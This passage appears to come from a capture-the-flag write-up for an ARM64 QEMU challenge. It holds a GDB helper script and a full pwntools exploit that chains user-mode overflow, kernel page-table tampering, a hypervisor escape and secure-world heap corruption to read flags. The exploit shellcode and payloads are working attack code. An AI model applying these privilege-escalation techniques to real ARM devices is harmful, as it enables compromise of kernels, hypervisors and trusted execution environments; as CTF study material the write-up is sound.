            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        if state:
            re += '32-BIT | '
        else:
            re += '64-BIT | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)


class TCR_EL1(gdb.Command):
    def __init__(self):
        super(TCR_EL1, self).__init__("tcr_el1", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        arg = arg.split()
        if len(arg) == 1:
            tcr = int(arg[0],16)
        elif len(arg) == 0:
            tcr = int(gdb.parse_and_eval('$TCR_EL1'))
        else:
            print("usuage: tcr_el1 [value (optional)]")
            return

        T0SZ = tcr &0b111111
        T1SZ = tcr >> 16
        T1SZ &= 0b111111
        TG1 = int((tcr>> 30) & 0b11)
        granule_bits = {0b01: 14, 0b10: 12, 0b11: 16}[TG1]
        print("T0:",hex(0),'~',hex(2 ** (64-T0SZ)-1))
        print("T1:",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff))
        print('granule_bits:',granule_bits)

class QEMU_SUPPORT(gdb.Command):
    address_space = {
        'cpu-memory-0':{
            'system' : {
                'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff},
                'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff},
                'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff},
            }
        },
        'cpu-secure-memory-0': {
            'hitcon.flash0' : {'start' : 0x0000000000000000, 'end' : 0x0000000003ffffff},
            'system' : {
                'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff},
                'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff},
                'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff},
            },
            'hitcon.secure-ram' : {'start' : 0x000000000e000000, 'end' : 0x000000000effffff}
        }
    } # monitor info mtree 
    @staticmethod
    def get_remote_pid(proc_name):
        pids = []
        for process in psutil.process_iter():
            if proc_name in process.name():
                pids.append(process.pid)
        if len(pids) != 1:
            return False
        return pids[0]

    def __init__(self):
        super(QEMU_SUPPORT, self).__init__("qemu_support", gdb.COMMAND_USER)
        pid = self.get_remote_pid('qemu-system-aarch64')
        if pid != False:
            self.pid = pid

    def read_memory(self, addr, length):
        gdb.selected_inferior().read_memory(addr, length).tobytes()

    def find_region_recursive(self, addr):
        def find_region_step(obj, key):
            assert type(obj) == type({})
            if 'start' in obj and 'end' in obj:
                if addr >= obj['start'] and addr <= obj['end']:
                    return key
                else:
                    return False
            else:
                for i in obj:
                    
                    if find_region_step(obj[i], i) != False:
                        return i
                return False
        return (find_region_step(QEMU_SUPPORT.address_space, ''))

    def read_phys(self, addr, length):
        def slow_path():
            ret = gdb.execute(f"monitor gpa2hva {addr}", to_string=True)
            r = re.search("is (0x[0-9a-f]+)", ret)
            if r:
                host_va = int(r.group(1),16)
                with open(f'/proc/{self.pid}/mem','rb') as f:
                    f.seek(host_va)
                    data = f.read(length)
                return data
            else:
                print('Err read_phys() -> slow_path()')

        def fast_path():
            gdb.execute(f'monitor xp/{length//8}xg {addr}')
            return True

        reg = self.find_region_recursive(addr) # secure mem or non-secure?
        if reg == 'cpu-secure-memory-0':
            return slow_path()
        elif reg == 'cpu-memory-0':
            return fast_path()
        else:
            print("Err find_region_recursive()",reg)
            return
       # secure world can access non-secure mem as well as secure mem.

    def invoke(self, arg, from_tty):
        arg = arg.split()
        if len(arg) > 0:
            if arg[0] == 'read_phys':
                if len(arg) > 2:
                    if arg[1].startswith('0x'):
                        addr = int(arg[1],16)
                    else:
                        addr = int(arg[1],10)
                    if arg[2].startswith('0x'):
                        length = int(arg[2],16)
                    else:
                        length = int(arg[2],10)
                    data = self.read_phys(addr, length*8)
                    if data != True:
                        self.qword_dump(data, addr,length)
        else:
            print("invalid args")

    @staticmethod
    def qword_dump(data, addr, length):
        for i in range(length):
            if i%2==0:
                ad = hex(addr + i*0x8)[2:].rjust(16,'0')
                print(f'{ad}',end=': ')
            a = hex(struct.unpack("<Q", data[8*i:8*i+8])[0])[2:].rjust(16,'0')
            print(f"0x{a}",end = ' ')
            if i%2==1:
                print()
        if (length-1)%2==0:
            print()

QEMU_SUPPORT()
TCR_EL1()
CPSR()
SPSR_EL3()
```
## Exploit code (S-SEL3)
```python
from pwn import *
from keystone import *

sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)
sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop

    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337

    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode

p = remote('localhost',6666)
# p = process('./local_debug.sh')
# p = process('./local_debug_secure.sh')

payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1

sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)

sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)

sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)

read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185]
SEL3_shellcode = asm('''\
    mov x0, sp
''')
SEL3_shellcode += bytes(read_flag)
SEL3_shellcode += asm('''\
ldr x11, =0x09000000
mov x8, #0
loop_print_flag_sel3:                  
    add x1, sp, x8 // dst
    ldrb w0, [x1]
    strb w0, [x11]
    add x8, x8, #1
    cmp x8, #32
    bne loop_print_flag_sel3
''')

# 0x000000000e002210 00000fb0
WORLD_SHARED_MEM_VA = 0x023fe000
WORLD_SHARED_MEM_PA = 0x40033000 
SEL1_shellcode = b''
SEL1_shellcode += asm(f'''\
    ldr r0, ={WORLD_SHARED_MEM_VA}
    add r10, r0, #0x20c
    mov r9, #0
    ldr r2, =0x100de8 // 0xe499000 + 0xde8
    loop:
        add r0, r10, r9 
        add r1, r2, r9
        ldrb r0, [r0]
        strb r0, [r1]
        add r9, r9, #1
        cmp r9, #{len(SEL3_shellcode)}
        bne loop
        
    // mapping
    ldr r0, =0x8005008
    ldr r1, =0xe00364f
    str r1, [r0]
    mov r0, #0x1000
    ldr r1, =0xe499783
    str r1, [r0]

    // ctx
    ldr r0, =0x8005008
    ldr r1, =0xe00264f  
    str r1, [r0] // tlb is already cached by the softmmu
    mcr p15, 0, r0, c8, c7, 0 
    dsb sy
    isb
    mov r0, #0x1328
    ldr r1, =0x800002cc
    str r1, [r0]
    mov r0, #0x1330
    mov r1, #0
    str r1, [r0]
''',arch='arm') # dummy code is added. 
# SEL1_shellcode += b'\xfe\xff\xff\xea' # loop for debugging
SEL1_shellcode += asm('''\
    mov r0, 0x8300
    lsl r0, r0, #16
    orr r0, r0, #0x7
''',arch='arm') # separation needed.
SEL1_shellcode += bytes.fromhex('70 00 60 e1')

TCI_Data_addr = 0x4010225c
SEL0_shellcode = b"\x00\xf0\x08\xe8" # thumb switch
SEL0_shellcode += b'A'*0x10
SEL0_shellcode += asm(f'''\
    mov r10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}
    lsl r10, r10, #16 
    orr r10, r10, #{(WORLD_SHARED_MEM_VA)&0xffff}
    add r10, r10, #0x10c 
    mov r0, #0xb
    mov r1, r10
    svc 0x1
    svc 0x0 // return to normal world
''',arch='arm')
SEL0_shellcode += b'A' * (0x100 - len(SEL0_shellcode))
SEL0_shellcode += SEL1_shellcode
assert len(SEL0_shellcode) <= 0x200
SEL0_shellcode += b'A' * (0x200 - len(SEL0_shellcode))
SEL0_shellcode += SEL3_shellcode

SEL0_shellcode_src = 0x40035500
UART= 0x0000000009000000

TCI_Data = b''
TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 
TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b'A' * 0x18# chunk 1
TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b'B' * 0x14 # chunk 2

EL2_shellcode = asm(f'''\
    movz x11, #{((UART)>>48)&0xffff}, lsl #48
    movk x11, #{((UART)>>32)&0xffff}, lsl #32
    movk x11, #{((UART)>>16)&0xffff}, lsl #16
    movk x11, #{(UART)&0xffff}, lsl #0
    mov x0, sp
''') + bytes(read_flag) + asm(f'''\
    mov x9, #0
    loop:
        add x0, sp, x9 
        ldrb w0, [x0]
        strb w0, [x11]
        add x9, x9, #1
        cmp x9, #32
        bne loop

 
    movk x10, #{((WORLD_SHARED_MEM_VA)>>16)&0xffff}, lsl #16
    movk x10, #{(WORLD_SHARED_MEM_VA)&0xffff}, lsl #0

    movz x9, #{((WORLD_SHARED_MEM_PA)>>48)&0xffff}, lsl #48
    movk x9, #{((WORLD_SHARED_MEM_PA)>>32)&0xffff}, lsl #32
    movk x9, #{((WORLD_SHARED_MEM_PA)>>16)&0xffff}, lsl #16
    movk x9, #{(WORLD_SHARED_MEM_PA)&0xffff}, lsl #0
    movz x20, #{((SEL0_shellcode_src)>>48)&0xffff}, lsl #48
    movk x20, #{((SEL0_shellcode_src)>>32)&0xffff}, lsl #32
    movk x20, #{((SEL0_shellcode_src)>>16)&0xffff}, lsl #16
    movk x20, #{(SEL0_shellcode_src)&0xffff}, lsl #0
    add x21, x9, #0xc // shellcode_dst, TCI buf payload


    mov x25, #0
    alloc_loop:
        // alloc(i, 0x20, b'')
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x20, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        add x25, x25, #1
        cmp x25, #{3}
        bne alloc_loop
    mov x25, #2
    free_loop:
        // free 2, 1, 0
        mov w2, #3
        str w2, [x9] // cmd
        mov w2, w25
        str w2, [x9, #4] // idx
        movz w2, #0x0000, lsl 16
        movk w2, #0x40, lsl 0
        str w2, [x9, #8] // sz
        movz x0, #0x8300, lsl 16          
        movk x0, #0x06, lsl 0
        mov x1, x10
        smc #0x1337
        cmp x25, #{0}
        sub x25, x25, #1
        bne free_loop

    //trigger the vuln
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #0
    str w2, [x9, #4] // idx
    movz w2, #0xffff, lsl 16
    movk w2, #0xffff, lsl 0
    str w2, [x9, #8] // sz
    movz x22, #{((TCI_Data_addr)>>48)&0xffff}, lsl #48
    movk x22, #{((TCI_Data_addr)>>32)&0xffff}, lsl #32
    movk x22, #{((TCI_Data_addr)>>16)&0xffff}, lsl #16
    movk x22, #{(TCI_Data_addr)&0xffff}, lsl #0
    mov x8, #0x0 
    loop_tci:                  
        add x2, x21, x8 // dst
        add x1, x22, x8 // src
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(TCI_Data)}
        bne loop_tci
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    // unlink AAW trigger
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #4
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x20, lsl 0
    str w2, [x9, #8] // sz

    movz w2, 0x0010, lsl #16
    movk w2, 0x0050, lsl #0
    str w2, [x9, #16] // data + 4
    str w2, [x9, #20] // this is needed to get out of the freelist loop.
    
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    // get .text
    mov w2, #3
    str w2, [x9] // cmd
    mov w2, #5
    str w2, [x9, #4] // idx
    movz w2, #0x0000, lsl 16
    movk w2, #0x1900, lsl 0
    str w2, [x9, #8] // sz
    mov x8, #0x0 
    loop_copy:                  
        add x2, x21, x8
        add x1, x20, x8
        ldrb w0, [x1]
        strb w0, [x2]
        add x8, x8, #1
        cmp x8, #{len(SEL0_shellcode)}
        bne loop_copy
    movz x0, #0x8300, lsl 16          
    movk x0, #0x06, lsl 0
    mov x1, x10
    smc #0x1337

    movz x0, #0x8300, lsl 16          
    movk x0, #0x05, lsl 0
    ldr x1, =0x2000000
    mov x2, #0x100
    smc #0x1337
    mov x8, #0x0 

''') 

EL2_shellcode +=  b'A' * (0x250- len(EL2_shellcode)) + TCI_Data


EL2_shellcode = b'\x41'*0xc+EL2_shellcode
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
IPA = 0x2400 | (0b11<<6) # s2ap 11
DESC = 3 | 0x100000
EL2_TEXT = 0x00007ffeffffa000
entry_user = 0xffffffffc0028000 + 0xfd0
user_val = 0x2403 | 64 | 0x0020000000000000# ap 01

EL2_shellcode_addr = 0x7ffeffffc100
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
    mov x0, #1 
    movz x1, #{((IPA)>>48)&0xffff}, lsl #48
    movk x1, #{((IPA)>>32)&0xffff}, lsl #32
    movk x1, #{((IPA)>>16)&0xffff}, lsl #16
    movk x1, #{(IPA)&0xffff}, lsl #0
    movz x2, #{((DESC)>>48)&0xffff}, lsl #48
    movk x2, #{((DESC)>>32)&0xffff}, lsl #32
    movk x2, #{((DESC)>>16)&0xffff}, lsl #16
    movk x2, #{(DESC)&0xffff}, lsl #0
    hvc #0x1337 // PA 0x0000000040102000 RWX
    movz x11, #{((entry_user)>>48)&0xffff}, lsl #48
    movk x11, #{((entry_user)>>32)&0xffff}, lsl #32
    movk x11, #{((entry_user)>>16)&0xffff}, lsl #16
    movk x11, #{(entry_user)&0xffff}, lsl #0
    movz x10, #{((user_val)>>48)&0xffff}, lsl #48
    movk x10, #{((user_val)>>32)&0xffff}, lsl #32
    movk x10, #{((user_val)>>16)&0xffff}, lsl #16
    movk x10, #{(user_val)&0xffff}, lsl #0
    str x10, [x11] // IPA 0x0000000000002000 RW

    movz x11, #{((EL2_TEXT)>>48)&0xffff}, lsl #48
    movk x11, #{((EL2_TEXT)>>32)&0xffff}, lsl #32
    movk x11, #{((EL2_TEXT)>>16)&0xffff}, lsl #16
    movk x11, #{(EL2_TEXT)&0xffff}, lsl #0
    movz x12, #{((EL2_shellcode_addr)>>48)&0xffff}, lsl #48
    movk x12, #{((EL2_shellcode_addr)>>32)&0xffff}, lsl #32
    movk x12, #{((EL2_shellcode_addr)>>16)&0xffff}, lsl #16
    movk x12, #{(EL2_shellcode_addr)&0xffff}, lsl #0

    mov x9, #0x0 
    loop:                  
        add x2, x11, x9
        add x1, x12, x9
        ldrb w0, [x1]
        strb w0, [x2]
        add w9, w9, #1
        cmp x9, #{len(EL2_shellcode)}
        bne loop

    hvc #0x1337 // trigger!!!
''')

cnt = len(EL1_shellcode)
val = 0x0040000000036483

shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop

    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337

    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337 // IPA 0x37000

    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0

    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table

    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]

    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x100 - len(payload))
payload += EL2_shellcode 
assert len(payload) <= 0x500
payload += b'\x41' * (0x500 - len(payload))
payload += SEL0_shellcode
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
sleep(0.1)
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
sleep(0.1)
p.interactive()
```